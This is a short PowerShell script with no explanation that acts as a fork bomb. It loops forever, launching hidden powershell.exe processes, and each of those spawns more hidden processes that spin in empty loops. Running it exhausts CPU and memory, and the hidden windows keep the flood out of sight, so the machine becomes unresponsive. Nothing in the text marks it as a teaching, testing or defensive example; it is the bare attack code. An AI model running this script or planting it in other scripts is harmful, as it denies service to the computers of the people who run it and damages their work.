while($true) {
    Start-Process powershell.exe -ArgumentList "-Command `"`$pid = [System.Diagnostics.Process]::GetCurrentProcess().Id; while(`$true){Start-Process powershell.exe -ArgumentList `'-Command `"while(`$true){}`"'` -WindowStyle Hidden;}`"`" -WindowStyle Hidden
}
